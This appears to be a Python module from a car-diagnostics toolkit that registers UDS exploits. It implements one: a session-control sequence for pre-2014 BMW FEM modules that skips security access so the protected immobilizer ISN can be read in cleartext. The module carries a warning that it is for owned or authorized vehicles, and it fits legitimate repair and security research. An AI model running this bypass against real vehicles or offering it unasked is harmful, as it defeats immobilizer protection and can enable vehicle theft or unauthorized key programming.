"""Registry of known UDS-side software exploits.

Each exploit is keyed by an ID that EcuProfile.known_software_exploit_ids
references. Adding a new exploit = add an Exploit + a coroutine; no other
file needs to change.

⚠️  Exploits are dual-use security research. Use only on vehicles you own
    or have written authorization to service. See repo SECURITY.md.
"""
from __future__ import annotations

from dataclasses import dataclass
from typing import Awaitable, Callable

from ...uds.client import UdsClient

ExploitFn = Callable[[UdsClient], Awaitable[None]]


@dataclass(frozen=True)
class Exploit:
    id: str
    description: str
    target_profile_glob: str          # e.g. "FEM_F30*"
    apply: ExploitFn


# --- Exploit implementations -----------------------------------------------
async def _fem_pre_2014_prgsess_bypass(client: UdsClient) -> None:
    """Pre-firmware-2014 FEM accepted programmingSession (0x10 0x02) without
    a prior security access on some PT-CAN paths. Documented widely on
    BMW reverse-engineering forums.

    Sequence: extended → programming → tester-present spam to keep alive.
    On vulnerable firmware, this leaves the ECU in a state where Read
    of the protected ISN DID returns the cleartext value.
    """
    await client.diagnostic_session_control(0x03)
    await client.diagnostic_session_control(0x02)
    for _ in range(3):
        await client.tester_present()


CATALOG: dict[str, Exploit] = {
    "FEM_PRE_2014_PRGSESS_BYPASS": Exploit(
        id="FEM_PRE_2014_PRGSESS_BYPASS",
        description="Pre-2014 FEM accepts programming session without security access",
        target_profile_glob="FEM_F30",
        apply=_fem_pre_2014_prgsess_bypass,
    ),
}


def get(exploit_id: str) -> Exploit:
    if exploit_id not in CATALOG:
        raise KeyError(f"No exploit registered with id {exploit_id!r}")
    return CATALOG[exploit_id]
